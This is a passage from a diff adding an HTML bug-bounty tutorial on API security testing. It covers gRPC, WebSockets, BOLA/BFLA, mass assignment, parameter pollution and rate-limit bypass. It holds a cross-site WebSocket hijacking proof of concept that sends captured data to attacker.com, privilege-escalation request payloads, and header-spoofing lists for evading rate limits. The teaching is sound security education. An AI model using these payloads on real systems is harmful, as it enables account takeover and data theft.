+                        admin mutations like <code style="color: #c084fc;">deleteUser</code>,
+                        <code style="color: #c084fc;">updateRole</code>, or
+                        <code style="color: #c084fc;">resetPassword</code>? Can an unauthenticated user
+                        invoke mutations that should require authentication? Mutation abuse is the GraphQL
+                        equivalent of BFLA in REST APIs and consistently produces high-severity findings.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: gRPC & WebSocket Testing -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128259;</span>
+            gRPC &amp; WebSocket Testing
+        </h2>
+        <div class="section-body">
+            <p>
+                While REST and GraphQL dominate public-facing APIs, gRPC and WebSockets are increasingly
+                common in internal services, real-time applications, and microservice communication. Both
+                protocols receive less security scrutiny than REST, making them high-value targets for bug
+                hunters who invest time in learning protocol-specific testing techniques.
+            </p>
+
+            <h3>gRPC Fundamentals and Reflection</h3>
+
+            <p>
+                gRPC uses Protocol Buffers (protobuf) as its serialization format and HTTP/2 as its
+                transport layer. Unlike REST's human-readable JSON, gRPC messages are binary-encoded.
+                gRPC Server Reflection is the equivalent of GraphQL introspection &mdash; when enabled,
+                it allows clients to discover all available services and methods at runtime without
+                needing the <code style="color: #c084fc;">.proto</code> definition files.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># grpcurl &mdash; command-line tool for interacting with gRPC servers</span>
+<span class="comment"># Like curl but for gRPC</span>
+
+<span class="comment"># List all services via reflection</span>
+$ <span class="kw">grpcurl</span> <span class="flag">-plaintext</span> target.com:50051 <span class="cmd">list</span>
+grpc.reflection.v1alpha.ServerReflection
+com.target.UserService
+com.target.AdminService
+com.target.InternalService
+
+<span class="comment"># List methods for a specific service</span>
+$ <span class="kw">grpcurl</span> <span class="flag">-plaintext</span> target.com:50051 <span class="cmd">list</span> com.target.UserService
+com.target.UserService.GetUser
+com.target.UserService.UpdateUser
+com.target.UserService.DeleteUser
+com.target.UserService.ListUsers
+
+<span class="comment"># Describe a method (shows request/response types)</span>
+$ <span class="kw">grpcurl</span> <span class="flag">-plaintext</span> target.com:50051 <span class="cmd">describe</span> com.target.UserService.GetUser
+
+<span class="comment"># Call a method with JSON input</span>
+$ <span class="kw">grpcurl</span> <span class="flag">-plaintext</span> \
+     <span class="flag">-d</span> <span class="str">'{"user_id": "1337"}'</span> \
+     target.com:50051 com.target.UserService.GetUser
+
+<span class="comment"># Call an admin method (test for missing authorization)</span>
+$ <span class="kw">grpcurl</span> <span class="flag">-plaintext</span> \
+     <span class="flag">-d</span> <span class="str">'{"user_id": "1337", "role": "admin"}'</span> \
+     target.com:50051 com.target.AdminService.UpdateRole
+</div>
+
+            <h3>Protobuf Decoding</h3>
+
+            <p>
+                When reflection is disabled, you may encounter raw protobuf data in network traffic. Binary
+                protobuf messages can be partially decoded without the schema &mdash; field numbers and wire
+                types are visible, and string and integer values can be extracted. Tools like
+                <code style="color: #c084fc;">protoc --decode_raw</code> and
+                <code style="color: #c084fc;">pbtk</code> (Protobuf Toolkit) decode raw messages and help
+                reconstruct the schema from observed traffic.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Decode raw protobuf without a .proto file</span>
+$ <span class="kw">protoc</span> <span class="flag">--decode_raw</span> &lt; captured_message.bin
+1: 1337
+2: <span class="str">"admin@target.com"</span>
+3: <span class="str">"John Doe"</span>
+4: 1
+5 {
+  1: <span class="str">"ROLE_ADMIN"</span>
+  2: 1708300800
+}
+
+<span class="comment"># pbtk &mdash; Protobuf Toolkit for extracting .proto from binaries</span>
+$ <span class="kw">python3</span> <span class="flag">-m</span> pbtk extractors/from_binary target_app_binary
+</div>
+
+            <h3>gRPC-Web Interception</h3>
+
+            <p>
+                gRPC-Web is a JavaScript library that allows browser-based clients to communicate with
+                gRPC backends. Because browsers do not natively support HTTP/2 trailers required by gRPC,
+                gRPC-Web uses a proxy (typically Envoy) that translates between gRPC-Web and native gRPC.
+                This proxy is interceptable with Burp Suite &mdash; the requests use standard HTTP/1.1 or
+                HTTP/2 with <code style="color: #c084fc;">application/grpc-web</code> content type. The
+                body contains base64-encoded protobuf that can be decoded, modified, and re-encoded.
+            </p>
+
+            <h3>WebSocket Connection Hijacking</h3>
+
+            <p>
+                WebSocket connections begin with an HTTP Upgrade handshake, then switch to a persistent
+                bidirectional channel. Security controls applied during the handshake must remain enforced
+                for the lifetime of the connection. Common WebSocket vulnerabilities include:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Missing origin validation</strong> &mdash; The server does not check the Origin header during the Upgrade handshake, enabling cross-site WebSocket hijacking</li>
+                <li><strong style="color: #c4a0d8;">No authentication on messages</strong> &mdash; Authentication is checked during the initial HTTP handshake but not on individual WebSocket messages</li>
+                <li><strong style="color: #c4a0d8;">Message injection</strong> &mdash; User input included in WebSocket messages without sanitization, enabling XSS or command injection through the WebSocket channel</li>
+                <li><strong style="color: #c4a0d8;">Lack of rate limiting</strong> &mdash; WebSocket messages bypass HTTP-based rate limiters entirely</li>
+                <li><strong style="color: #c4a0d8;">Information leakage</strong> &mdash; Broadcast channels that send data to all connected clients without authorization checks</li>
+            </ul>
+
+            <h3>Cross-Site WebSocket Hijacking (CSWSH)</h3>
+
+            <p>
+                CSWSH is the WebSocket equivalent of CSRF. If a WebSocket endpoint does not validate the
+                Origin header, an attacker can create a malicious page that opens a WebSocket connection
+                to the target in the context of the victim's browser session. The victim's cookies are
+                automatically sent with the Upgrade request, authenticating the attacker's connection.
+            </p>
+
+            <div class="code-block">
+<span class="comment">&lt;!-- CSWSH proof of concept --&gt;</span>
+<span class="comment">&lt;!-- Host this on attacker.com; victim visits while authenticated to target.com --&gt;</span>
+
+&lt;<span class="kw">script</span>&gt;
+  <span class="comment">// Victim's browser sends session cookies with the WebSocket upgrade</span>
+  var ws = new WebSocket(<span class="str">"wss://target.com/ws/chat"</span>);
+
+  ws.onopen = function() {
+    <span class="comment">// Connection established with victim's session</span>
+    <span class="comment">// Send commands as the victim</span>
+    ws.send(JSON.stringify({
+      action: <span class="str">"getMessages"</span>,
+      channel: <span class="str">"admin"</span>
+    }));
+  };
+
+  ws.onmessage = function(event) {
+    <span class="comment">// Exfiltrate received data to attacker's server</span>
+    new Image().src = <span class="str">"https://attacker.com/log?data="</span>
+      + encodeURIComponent(event.data);
+  };
+&lt;/<span class="kw">script</span>&gt;
+</div>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">grpcurl</div>
+                    <div class="tool-role">Go &middot; gRPC Client</div>
+                    <div class="tool-desc">
+                        Command-line gRPC client. Supports reflection-based discovery, JSON input/output,
+                        TLS, and metadata headers for authentication. The curl of gRPC testing.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Burp Suite WebSocket</div>
+                    <div class="tool-role">Built-in &middot; WebSocket Proxy</div>
+                    <div class="tool-desc">
+                        Burp Suite's proxy intercepts WebSocket messages for inspection, modification,
+                        and replay. The WebSocket history tab logs all messages. Use the Repeater to
+                        craft and send individual WebSocket frames.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">websocat</div>
+                    <div class="tool-role">Rust &middot; WebSocket CLI</div>
+                    <div class="tool-desc">
+                        Command-line WebSocket client for scripting and automation. Pipe input from files
+                        or other commands, connect to WebSocket endpoints with custom headers, and log
+                        all traffic for analysis.
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Protocol Diversity as Opportunity</div>
+                    <div class="callout-text">
+                        Most bug hunters focus exclusively on REST APIs. gRPC and WebSocket endpoints
+                        receive far less scrutiny, meaning findings are less likely to be duplicates. If
+                        a program's application uses real-time features (chat, notifications, live updates),
+                        there is almost certainly a WebSocket endpoint worth testing. If the backend is
+                        microservice-based, gRPC may be exposed &mdash; especially on non-standard ports.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: BOLA & BFLA -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128274;</span>
+            BOLA &amp; BFLA
+        </h2>
+        <div class="section-body">
+            <p>
+                The OWASP API Security Top 10 was created specifically to address vulnerabilities unique
+                to APIs, separate from the traditional OWASP Web Application Top 10. At the top of the
+                API-specific list are BOLA (Broken Object Level Authorization) and BFLA (Broken Function
+                Level Authorization) &mdash; the API equivalents of IDOR and privilege escalation. These
+                two vulnerability classes account for more high-severity API bounty reports than all other
+                categories combined.
+            </p>
+
+            <h3>OWASP API Security Top 10</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Name</th>
+                        <th>Severity</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">API1</td>
+                        <td>Broken Object Level Authorization</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>Accessing other users' objects by manipulating IDs in API requests. The most common and impactful API vulnerability.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API2</td>
+                        <td>Broken Authentication</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>Weak authentication mechanisms: predictable tokens, missing token validation, authentication bypass via API versioning.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API3</td>
+                        <td>Broken Object Property Level Authorization</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Excessive data exposure and mass assignment. API returns more fields than needed or accepts fields that should be read-only.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API4</td>
+                        <td>Unrestricted Resource Consumption</td>
+                        <td><span class="badge badge-medium">Medium</span></td>
+                        <td>Missing rate limiting, pagination limits, or resource allocation controls. Enables DoS and brute-force attacks.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API5</td>
+                        <td>Broken Function Level Authorization</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>Regular users accessing admin API functions. Often found by changing HTTP method or guessing admin endpoint paths.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API6</td>
+                        <td>Unrestricted Access to Sensitive Business Flows</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Automated abuse of business-critical workflows: ticket scalping, mass account creation, coupon abuse via API.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API7</td>
+                        <td>Server Side Request Forgery</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>API accepts URLs as input and fetches them server-side. Access internal services, cloud metadata, and local files.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API8</td>
+                        <td>Security Misconfiguration</td>
+                        <td><span class="badge badge-medium">Medium</span></td>
+                        <td>Missing security headers, verbose errors, unnecessary HTTP methods, permissive CORS, exposed debug endpoints.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API9</td>
+                        <td>Improper Inventory Management</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Outdated API versions, unpatched endpoints, shadow APIs (undocumented). Lack of API inventory and lifecycle management.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API10</td>
+                        <td>Unsafe Consumption of APIs</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Trusting data from third-party APIs without validation. Injection via upstream API responses, SSRF via redirects.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>BOLA: Broken Object Level Authorization</h3>
+
+            <p>
+                BOLA occurs when an API endpoint accepts an object identifier from the client (user ID,
+                order number, document UUID) and returns or modifies that object without verifying the
+                requesting user is authorized to access it. This is the single most common API vulnerability
+                and the one most likely to produce a bounty. Every API endpoint that accepts an identifier
+                is a potential BOLA target.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># BOLA testing methodology</span>
+
+<span class="comment"># Step 1: Create two accounts (User A and User B)</span>
+<span class="comment"># Step 2: As User A, perform actions and capture the API requests</span>
+<span class="comment"># Step 3: Note all object IDs in URLs, body, and headers</span>
+
+<span class="comment"># Step 4: Replay User A's requests using User B's auth token</span>
+
+<span class="comment"># Read another user's data (horizontal BOLA)</span>
+<span class="kw">GET</span> /api/v1/users/<span class="str">1001</span>/profile
+Authorization: Bearer <span class="flag">&lt;user_B_token&gt;</span>
+<span class="comment"># If this returns User A's profile = BOLA</span>
+
+<span class="comment"># Modify another user's data</span>
+<span class="kw">PUT</span> /api/v1/users/<span class="str">1001</span>/profile
+Authorization: Bearer <span class="flag">&lt;user_B_token&gt;</span>
+Content-Type: application/json
+
+{<span class="str">"email"</span>: <span class="str">"attacker@evil.com"</span>}
+<span class="comment"># If this succeeds = write BOLA (higher severity)</span>
+
+<span class="comment"># Delete another user's resource</span>
+<span class="kw">DELETE</span> /api/v1/users/<span class="str">1001</span>/orders/<span class="str">5042</span>
+Authorization: Bearer <span class="flag">&lt;user_B_token&gt;</span>
+<span class="comment"># If this succeeds = destructive BOLA (critical)</span>
+</div>
+
+            <h3>BFLA: Broken Function Level Authorization</h3>
+
+            <p>
+                BFLA occurs when a regular user can invoke API functions intended for administrators or
+                higher-privilege roles. Unlike BOLA (which is about accessing specific objects), BFLA is
+                about accessing entire categories of functionality. The classic pattern: an application
+                hides admin UI elements from regular users but the underlying API endpoints accept
+                requests from any authenticated user.
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128274; BOLA Patterns</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Sequential integer IDs (/users/1001, /users/1002)</li>
+                        <li><span class="li-marker">&#9654;</span>UUIDs leaked in other responses or URL patterns</li>
+                        <li><span class="li-marker">&#9654;</span>Encoded IDs (Base64, hex) that are easily decoded</li>
+                        <li><span class="li-marker">&#9654;</span>Object references in request body, not just URL</li>
+                        <li><span class="li-marker">&#9654;</span>Nested resource access (/orgs/1/users/2/docs/3)</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#128275; BFLA Patterns</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Admin endpoints accessible with user token</li>
+                        <li><span class="li-marker">&#9654;</span>Changing HTTP method reveals different access (GET vs POST)</li>
+                        <li><span class="li-marker">&#9654;</span>Admin paths guessable from user paths (/api/users vs /api/admin/users)</li>
+                        <li><span class="li-marker">&#9654;</span>Role-specific endpoints with no role check server-side</li>
+                        <li><span class="li-marker">&#9654;</span>Internal API endpoints reachable from external network</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Testing Methodology for BOLA and BFLA</h3>
+
+            <ol class="numbered-list">
+                <li><strong style="color: #c4a0d8;">Create multiple accounts</strong> at different privilege levels: unauthenticated, standard user (User A), standard user (User B), and admin (if possible through self-registration or invitation).</li>
+                <li><strong style="color: #c4a0d8;">Map all endpoints</strong> and note every instance where an object identifier appears in the URL, request body, query parameters, or headers.</li>
+                <li><strong style="color: #c4a0d8;">Capture the full request set</strong> for the highest-privilege account using Burp Suite's proxy. This gives you the complete list of admin-only endpoints.</li>
+                <li><strong style="color: #c4a0d8;">Replay admin requests with user tokens.</strong> For every admin endpoint, substitute the admin's authorization token with a regular user's token. A 200 or non-403 response indicates BFLA.</li>
+                <li><strong style="color: #c4a0d8;">Swap object IDs between users.</strong> For every endpoint that operates on a specific resource, replace the resource ID with one belonging to another user. Test with both User A's ID from User B's session and vice versa.</li>
+                <li><strong style="color: #c4a0d8;">Test all HTTP methods.</strong> If GET is protected, try PUT, PATCH, DELETE, and POST on the same endpoint. Authorization checks are frequently implemented per-method, not per-endpoint.</li>
+                <li><strong style="color: #c4a0d8;">Test unauthenticated access.</strong> Remove the Authorization header entirely. Some endpoints intended for internal service-to-service calls have no authentication requirement at all.</li>
+            </ol>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Automated BOLA Detection at Scale</div>
+                    <div class="callout-text">
+                        Burp Suite's Autorize extension automates BOLA and BFLA testing. Configure it with
+                        two session tokens (low privilege and high privilege), then browse the application
+                        normally with the high-privilege account. Autorize automatically replays every
+                        request with the low-privilege token and flags endpoints where the response is
+                        identical or similar &mdash; indicating the authorization check is missing. This
+                        turns hours of manual testing into a passive background scan.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Mass Assignment & Parameter Pollution -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128221;</span>
+            Mass Assignment &amp; Parameter Pollution
+        </h2>
+        <div class="section-body">
+            <p>
+                Mass assignment and parameter pollution exploit the gap between what a frontend sends and
+                what a backend accepts. When a server binds incoming request parameters directly to internal
+                data models without filtering, attackers can inject fields that the application never intended
+                to expose &mdash; escalating their privileges, bypassing payment, or modifying data they
+                should not control.
+            </p>
+
+            <h3>Mass Assignment Explained</h3>
+
+            <p>
+                Mass assignment occurs when an API accepts a JSON body and maps it directly to a database
+                model without explicitly listing which fields are allowed. The frontend registration form
+                sends <code style="color: #c084fc;">{"name": "Alice", "email": "alice@example.com"}</code>,
+                but the backend User model has an <code style="color: #c084fc;">isAdmin</code> field. If
+                the API does not filter incoming fields, an attacker can include
+                <code style="color: #c084fc;">"isAdmin": true</code> in their registration request and
+                receive administrator privileges.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Mass assignment test: add unexpected fields to a legitimate request</span>
+
+<span class="comment"># Normal registration request (captured from frontend)</span>
+<span class="kw">POST</span> /api/v1/register
+Content-Type: application/json
+
+{
+  <span class="str">"name"</span>: <span class="str">"Alice"</span>,
+  <span class="str">"email"</span>: <span class="str">"alice@example.com"</span>,
+  <span class="str">"password"</span>: <span class="str">"SecurePass123!"</span>
+}
+
+<span class="comment"># Mass assignment attempt: inject privilege fields</span>
+<span class="kw">POST</span> /api/v1/register
+Content-Type: application/json
+
+{
+  <span class="str">"name"</span>: <span class="str">"Alice"</span>,
+  <span class="str">"email"</span>: <span class="str">"alice@example.com"</span>,
+  <span class="str">"password"</span>: <span class="str">"SecurePass123!"</span>,
+  <span class="str">"role"</span>: <span class="str">"admin"</span>,
+  <span class="str">"isAdmin"</span>: <span class="flag">true</span>,
+  <span class="str">"verified"</span>: <span class="flag">true</span>,
+  <span class="str">"balance"</span>: <span class="str">99999</span>,
+  <span class="str">"plan"</span>: <span class="str">"enterprise"</span>
+}
+
+<span class="comment"># Profile update: modify fields not exposed in the UI</span>
+<span class="kw">PUT</span> /api/v1/users/me
+Content-Type: application/json
+
+{
+  <span class="str">"name"</span>: <span class="str">"Alice Updated"</span>,
+  <span class="str">"role"</span>: <span class="str">"admin"</span>,
+  <span class="str">"organizationId"</span>: <span class="str">"1"</span>,
+  <span class="str">"permissions"</span>: [<span class="str">"read"</span>, <span class="str">"write"</span>, <span class="str">"delete"</span>, <span class="str">"admin"</span>]
+}
+</div>
+
+            <h3>Framework-Specific Patterns</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Framework</th>
+                        <th>Vulnerability Pattern</th>
+                        <th>Defense Mechanism</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Ruby on Rails</td>
+                        <td>ActiveRecord binds all request params to model attributes unless filtered. The 2012 GitHub mass assignment exploit used this to push to any repo.</td>
+                        <td><code style="color: #c084fc;">strong_parameters</code> &mdash; require/permit pattern. Only explicitly permitted fields are accepted.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Django (Python)</td>
+                        <td>Model forms accept all fields in the model by default. <code style="color: #c084fc;">ModelForm</code> with no <code style="color: #c084fc;">fields</code> or <code style="color: #c084fc;">exclude</code> is vulnerable.</td>
+                        <td>Explicit <code style="color: #c084fc;">fields = [...]</code> on forms and serializers. DRF serializers require declared fields.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Express (Node.js)</td>
+                        <td>Direct use of <code style="color: #c084fc;">req.body</code> in MongoDB/Mongoose operations: <code style="color: #c084fc;">User.create(req.body)</code> accepts any field.</td>
+                        <td>Destructure only needed fields: <code style="color: #c084fc;">const { name, email } = req.body;</code> or use validation libraries like Joi.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Spring (Java)</td>
+                        <td><code style="color: #c084fc;">@ModelAttribute</code> and Jackson deserialization bind JSON to POJOs. All settable fields are writable by default.</td>
+                        <td><code style="color: #c084fc;">@JsonIgnoreProperties</code>, DTOs (Data Transfer Objects) with limited fields, or <code style="color: #c084fc;">@InitBinder</code> with allowed fields.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Laravel (PHP)</td>
+                        <td><code style="color: #c084fc;">Model::create($request-&gt;all())</code> passes all input to the ORM. Mass assignment via <code style="color: #c084fc;">$fillable</code> misconfiguration.</td>
+                        <td><code style="color: #c084fc;">$fillable</code> (whitelist) or <code style="color: #c084fc;">$guarded</code> (blacklist) on Eloquent models. Use Form Requests for validation.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Finding Hidden Parameters</h3>
+
+            <p>
+                The key to successful mass assignment is knowing which fields exist on the backend model.
+                Several techniques reveal these hidden parameters:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">API response analysis</strong> &mdash; GET responses often include fields that are read-only on the frontend but writable on the backend. If the profile API returns <code style="color: #c084fc;">role</code>, try including it in a PUT request.</li>
+                <li><strong style="color: #c4a0d8;">Error messages</strong> &mdash; Some frameworks reveal model fields in validation errors: "Unknown field: isAdmin" confirms the field exists even if rejected.</li>
+                <li><strong style="color: #c4a0d8;">API documentation</strong> &mdash; Swagger/OpenAPI specs list all fields, including those not used by the frontend.</li>
+                <li><strong style="color: #c4a0d8;">Common field names</strong> &mdash; Test universally common fields: role, admin, isAdmin, verified, active, permissions, plan, tier, credits, balance, organizationId, groupId.</li>
+                <li><strong style="color: #c4a0d8;">Param Miner</strong> &mdash; Burp extension that automatically discovers hidden parameters by fuzzing with a wordlist of common field names.</li>
+            </ul>
+
+            <h3>HTTP Parameter Pollution (HPP)</h3>
+
+            <p>
+                HTTP parameter pollution occurs when multiple parameters with the same name are sent in a
+                single request, and different components in the request processing chain handle the duplicates
+                differently. A WAF may check the first occurrence while the application uses the last, allowing
+                the attacker to bypass input validation.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># HTTP Parameter Pollution — different servers handle duplicates differently</span>
+
+<span class="comment"># Sending duplicate parameters</span>
+<span class="kw">GET</span> /transfer?amount=100&amp;to=alice&amp;amount=99999
+
+<span class="comment"># How different servers parse this:</span>
+<span class="comment"># Apache/PHP    : amount = 99999 (last wins)</span>
+<span class="comment"># ASP.NET/IIS   : amount = "100,99999" (concatenated)</span>
+<span class="comment"># Node.js/Express: amount = ["100", "99999"] (array)</span>
+<span class="comment"># Python/Flask  : amount = 100 (first wins)</span>
+<span class="comment"># Java/Tomcat   : amount = 100 (first wins)</span>
+<span class="comment"># Python/Django  : amount = 99999 (last wins)</span>
+
+<span class="comment"># WAF bypass scenario:</span>
+<span class="comment"># 1. WAF checks first parameter and sees amount=100 (valid)</span>
+<span class="comment"># 2. Backend uses last parameter and processes amount=99999</span>
+
+<span class="comment"># POST body pollution (Content-Type: application/x-www-form-urlencoded)</span>
+<span class="kw">POST</span> /api/transfer
+amount=100&amp;to=alice&amp;amount=99999
+
+<span class="comment"># JSON pollution (duplicate keys)</span>
+{
+  <span class="str">"amount"</span>: 100,
+  <span class="str">"to"</span>: <span class="str">"alice"</span>,
+  <span class="str">"amount"</span>: 99999
+}
+<span class="comment"># Most JSON parsers use the last value for duplicate keys</span>
+</div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Mass Assignment Severity</div>
+                    <div class="callout-text">
+                        Mass assignment that modifies <code style="color: #c084fc;">role</code> or
+                        <code style="color: #c084fc;">isAdmin</code> is critical &mdash; it is a direct
+                        privilege escalation. Modifying <code style="color: #c084fc;">verified</code> or
+                        <code style="color: #c084fc;">active</code> is high severity (bypasses business
+                        logic). Modifying <code style="color: #c084fc;">balance</code> or
+                        <code style="color: #c084fc;">credits</code> is high severity (financial impact).
+                        Even modifying non-sensitive fields like <code style="color: #c084fc;">createdAt</code>
+                        demonstrates the vulnerability pattern and should be reported &mdash; if one field
+                        is unprotected, others likely are too.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Rate Limiting Bypass -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9201;</span>
+            Rate Limiting Bypass
+        </h2>
+        <div class="section-body">
+            <p>
+                Rate limiting is the primary defense against brute-force attacks, credential stuffing,
+                and API abuse. When a rate limiter is absent or bypassable, the attacker gains unlimited
+                attempts at authentication, password reset, OTP verification, and any other action that
+                should be throttled. Rate limiting bypasses are consistently accepted as valid findings
+                on bug bounty platforms because they directly enable other attacks.
+            </p>
+
+            <h3>Common Rate Limiting Implementations</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128187;</div>
+                    <div class="concept-card-title">IP-Based Limiting</div>
+                    <div class="concept-card-body">
+                        Tracks requests per source IP address. The most common implementation. Vulnerable
+                        to IP rotation, proxy chains, and header spoofing. Does not protect against
+                        distributed attacks.
+                    </div>
+                    <span class="concept-tag">Network Layer</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128273;</div>
+                    <div class="concept-card-title">Token/Session-Based</div>
+                    <div class="concept-card-body">
+                        Tracks requests per API key, session token, or user account. More resistant to IP
+                        rotation but vulnerable to token cycling and anonymous endpoint abuse. Better for
+                        authenticated endpoints.
+                    </div>
+                    <span class="concept-tag">Application Layer</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128202;</div>
+                    <div class="concept-card-title">Sliding Window</div>
+                    <div class="concept-card-body">
+                        Counts requests within a moving time window (e.g., 100 requests per 60 seconds).
+                        More accurate than fixed windows but can still be gamed by timing requests at
+                        window boundaries.
+                    </div>
+                    <span class="concept-tag">Algorithm</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128167;</div>
+                    <div class="concept-card-title">Token Bucket / Leaky Bucket</div>
+                    <div class="concept-card-body">
+                        Tokens are added at a fixed rate. Each request consumes a token. Allows short
+                        bursts while enforcing average rate. More resilient to bypass but complex to
+                        implement correctly across distributed systems.
+                    </div>
+                    <span class="concept-tag">Algorithm</span>
+                </div>
+            </div>
+
+            <h3>Bypass Techniques</h3>
+
+            <p>
+                Rate limiting bypasses exploit inconsistencies between how the rate limiter identifies
+                requests and how the application processes them. The goal is to make the rate limiter
+                see each request as unique while the application processes them identically.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Technique</th>
+                        <th>How It Works</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">IP Header Spoofing</td>
+                        <td>The rate limiter trusts X-Forwarded-For or similar headers to determine client IP. Rotate the header value to appear as different clients.</td>
+                        <td><code style="color: #c084fc;">X-Forwarded-For: 1.2.3.{N}</code> where N increments with each request</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Endpoint Variation</td>
+                        <td>Rate limits are applied per-path but the application normalizes paths. Different URL forms reach the same endpoint.</td>
+                        <td><code style="color: #c084fc;">/api/login</code>, <code style="color: #c084fc;">/api/LOGIN</code>, <code style="color: #c084fc;">/api/./login</code>, <code style="color: #c084fc;">/api/login/</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">HTTP Method Switching</td>
+                        <td>Rate limit applies to POST /login but the endpoint also accepts PUT or PATCH with the same functionality.</td>
+                        <td>Switch from POST to PUT, PATCH, or even GET with query parameters</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Unicode Normalization</td>
+                        <td>Unicode characters that normalize to ASCII equivalents. Rate limiter sees different strings; application normalizes to the same value.</td>
+                        <td>Username <code style="color: #c084fc;">admin</code> vs <code style="color: #c084fc;">&#x0061;dmin</code> (Unicode full-width 'a')</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Blank/Null Byte Injection</td>
+                        <td>Adding null bytes or whitespace characters that are stripped by the application but counted differently by the rate limiter.</td>
+                        <td><code style="color: #c084fc;">/api/login%00</code>, <code style="color: #c084fc;">/api/login%20</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">API Key Cycling</td>
+                        <td>Create multiple API keys or accounts and rotate between them. Each key has its own rate limit bucket.</td>
+                        <td>Register 10 accounts, distribute requests across all 10 tokens</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="code-block">
+<span class="comment"># IP header spoofing — test these headers individually and combined</span>
+<span class="kw">X-Forwarded-For</span>: <span class="str">127.0.0.1</span>
+<span class="kw">X-Real-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">X-Originating-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">X-Client-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">X-Remote-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">X-Remote-Addr</span>: <span class="str">127.0.0.1</span>
+<span class="kw">True-Client-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">CF-Connecting-IP</span>: <span class="str">127.0.0.1</span>
+<span class="kw">Forwarded</span>: <span class="str">for=127.0.0.1</span>
+
+<span class="comment"># Endpoint variation bypass</span>
+<span class="kw">POST</span> /api/login            <span class="comment"># Rate limited after 5 attempts</span>
+<span class="kw">POST</span> /api/login/           <span class="comment"># Trailing slash = new rate limit bucket</span>
+<span class="kw">POST</span> /api/./login          <span class="comment"># Dot segment = new bucket</span>
+<span class="kw">POST</span> /api/LOGIN            <span class="comment"># Case variation (if server is case-insensitive)</span>
